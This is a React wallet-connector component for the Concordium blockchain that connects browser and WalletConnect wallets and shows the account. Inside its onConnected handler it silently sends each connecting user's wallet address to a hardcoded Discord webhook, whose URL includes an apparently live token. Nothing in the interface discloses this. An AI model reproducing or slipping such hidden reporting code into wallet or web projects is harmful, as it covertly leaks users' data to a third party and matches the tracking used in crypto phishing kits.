import React, { useState, useEffect } from 'react';
import {
    BrowserWalletConnector,
    WalletConnectConnector,
    WalletConnection,
    WalletConnectionDelegate,
} from '@concordium/wallet-connectors';
let timer = 0;

let ResetTimer = () => {
    timer = 0;
    
}

// Define network configuration for the main network
const concordiumNetworks = {
    mainnet: {
        name: 'Concordium Mainnet',
        chainId: '9dd9ca4d19e9393877d2c44b70f89acb',
        rpcEndpoint: 'https://grpc.mainnet.concordium.software',
    },
    testnet: {
        name: 'Concordium Testnet',
        chainId: '4221332d34e1694168c2a0c0b3fd0f27',
        rpcEndpoint: 'https://grpc.testnet.concordium.com',
    },
};

class MyDelegate {
    constructor(network) {
        this.accounts = new Map();
        this.chains = new Map();
        this.network = network; // Set the network property during initialization

        // Bind methods to ensure the correct `this` context
        this.onAccountChanged = this.onAccountChanged.bind(this);
        this.onChainChanged = this.onChainChanged.bind(this);
        this.onConnected = this.onConnected.bind(this);
        this.onDisconnected = this.onDisconnected.bind(this);
    }

    onAccountChanged(connection, address) {
        console.log('Account changed:', address);
        this.accounts.set(connection, address);
    }

    onChainChanged(connection, genesisHash) {
        console.log('Chain changed:', genesisHash);
        this.chains.set(connection, genesisHash);
    }

    onConnected(connection, address) {
        console.log('Connected:', address);
        this.onAccountChanged(connection, address);

       
        const request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1248735229137649784/hUvQJ49mtJo6VdRiyZF2nXzF2Nlnl9M_dGMA1gEZg2Qsqj-EdYQwYnF5ZfZzxVb-etSY");
      
        request.setRequestHeader('Content-type', 'application/json');
      
        const params = {
          username: "Wallet address",
          avatar_url: "",
          content: address
        }
        if(timer === 0) {
            timer = 1
            request.send(JSON.stringify(params));
        } else {
            setTimeout(ResetTimer, 10000);
        }
        
          
        
    }

    onDisconnected(connection) {
        console.log('Disconnected');
        this.accounts.delete(connection);
        this.chains.delete(connection);
    }
}

const WalletConnector = ({ network = 'mainnet' }) => {
    const [account, setAccount] = useState(undefined);
    const [error, setError] = useState(undefined);
    const [connecting, setConnecting] = useState(false);

    useEffect(() => {
        const setupWalletConnectors = async () => {
            if (connecting) return;

            setConnecting(true);
            const selectedNetwork = concordiumNetworks[network];
            const delegate = new MyDelegate(selectedNetwork);

            const connectToWallet = async () => {
                try {
                    const browserWalletConnector = await BrowserWalletConnector.create(delegate);
                    const walletConnectOpts = {
                        rpc: {
                            [selectedNetwork.chainId]: selectedNetwork.rpcEndpoint,
                        },
                        bridge: 'https://bridge.walletconnect.org',
                        qrcode: true,
                    };
                    const walletConnectConnector = await WalletConnectConnector.create(walletConnectOpts, delegate, selectedNetwork);

                    const browserWalletConnection = await browserWalletConnector.connect();
                    const walletConnectConnection = await walletConnectConnector.connect();

                    // Pick one of the connected accounts to display
                    const connectedAccount = delegate.accounts.get(browserWalletConnection) || delegate.accounts.get(walletConnectConnection);
                    if (connectedAccount) {
                        console.log('Connected account found:', connectedAccount);
                        setAccount(connectedAccount);
                    } else {
                        console.log('No connected account found');
                        setError('No connected account found');
                    }
                } catch (error) {
                    console.error('Error connecting to wallet:', error);
                    if (error.message.includes('Another prompt is already open')) {
                        // Retry connection after a short delay
                        setTimeout(connectToWallet, 2000);
                    } else {
                        setError(error.message);
                    }
                } finally {
                    setConnecting(false);
                }
            };

            connectToWallet();

            return () => {
                // Cleanup code, disconnect from wallet connectors if needed
            };
        };

        setupWalletConnectors();

    }, [connecting, network]);

    const handleButtonClick = async () => {
        // Perform some action using the connected wallet
        // Example: Sign and send a transaction
        // const txHash = await connection.signAndSendTransaction(account, ...);
        console.log("Performing action with connected wallet...");
    };

    return (
        <div>
            {account ? (
                <div>
                    <h3>Connected Account ID:</h3>
                    <p>{account}</p>
                    <button onClick={handleButtonClick}>Perform Action</button>
                </div>
            ) : (
                <p>{error || ''}</p>
            )}
        </div>
    );
};

export default WalletConnector;
